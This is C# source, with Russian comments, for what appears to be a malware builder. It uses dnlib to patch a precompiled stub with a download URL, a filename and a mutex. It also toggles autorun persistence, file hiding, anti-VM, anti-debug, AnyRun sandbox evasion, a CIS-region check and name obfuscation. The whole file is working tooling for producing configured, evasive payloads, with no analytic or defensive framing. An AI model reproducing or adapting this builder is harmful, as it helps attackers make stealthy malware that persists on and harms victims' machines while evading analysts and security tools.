using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System;
using System.IO;
using System.Linq;
using static Builder.Modules.Obfuscator;


namespace Builder.Modules
{
    internal class Builder
    {
        public static string Execute(string outputFile, string url, string filename, string mutexValue, bool mutexUse, bool antiDebug, bool antiAnyRun,
               bool antiVM, bool antiCIS, bool autorun, bool hideFile, bool obfuscate)
        {
            // Путь к исходному stub.exe
            string stubPath = "Module\\stub.bin";

            if (!File.Exists(stubPath))
            {
                return "Stub file not found!";
            }

            try
            {
                // Загрузка сборки
                ModuleDefMD module = ModuleDefMD.Load(stubPath);

                // Имя класса, содержащего переменные
                string className = "Stub.Modules.config";

                // Поиск класса
                TypeDef classType = module.Types.FirstOrDefault(t => t.FullName == className);

                if (classType == null)
                {
                    return "Class not found!";
                }

                // Функция для изменения строковых литералов
                void UpdateStringLiteral(string oldValue, string newValue)
                {
                    foreach (var method in classType.Methods)
                    {
                        if (!method.HasBody) continue;

                        foreach (var instr in method.Body.Instructions)
                        {
                            if (instr.OpCode == OpCodes.Ldstr && (string)instr.Operand == oldValue)
                            {
                                instr.Operand = newValue;
                            }
                        }
                    }
                }

                // Функция для изменения булевых переменных
                void UpdateBoolField(string fieldName, bool newValue)
                {
                    FieldDef field = classType.Fields.FirstOrDefault(f => f.Name == fieldName);
                    if (field != null)
                    {
                        foreach (var method in classType.Methods)
                        {
                            if (!method.HasBody) continue;

                            for (int i = 0; i < method.Body.Instructions.Count; i++)
                            {
                                var instr = method.Body.Instructions[i];
                                if (instr.OpCode == OpCodes.Stsfld && instr.Operand == field)
                                {
                                    var prevInstr = method.Body.Instructions[i - 1];
                                    if (prevInstr.OpCode == OpCodes.Ldc_I4_0 || prevInstr.OpCode == OpCodes.Ldc_I4_1)
                                    {
                                        prevInstr.OpCode = newValue ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
                                    }
                                }
                            }
                        }
                    }
                }

                // Обновление строковых значений
                UpdateStringLiteral("%FILENAME%", filename);
                UpdateStringLiteral("%URL%", url);

                // Обновление MutexValue только если mutexUse == true
                if (mutexUse)
                {
                    UpdateStringLiteral("%MUTEX%", mutexValue);
                }

                // Обновление булевых значений
                UpdateBoolField("AutoRun", autorun);
                UpdateBoolField("HideFile", hideFile);
                UpdateBoolField("MutexControl", mutexUse);
                UpdateBoolField("AntiCIS", antiCIS);
                UpdateBoolField("AntiVM", antiVM);
                UpdateBoolField("AntiDebug", antiDebug);
                UpdateBoolField("AntiAnyRun", antiAnyRun);

                if (obfuscate)
                {
                    RenameProtector.Execute(module);
                }

                module.Write(outputFile);
                
                return "Success!";
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }
        }
    }
}
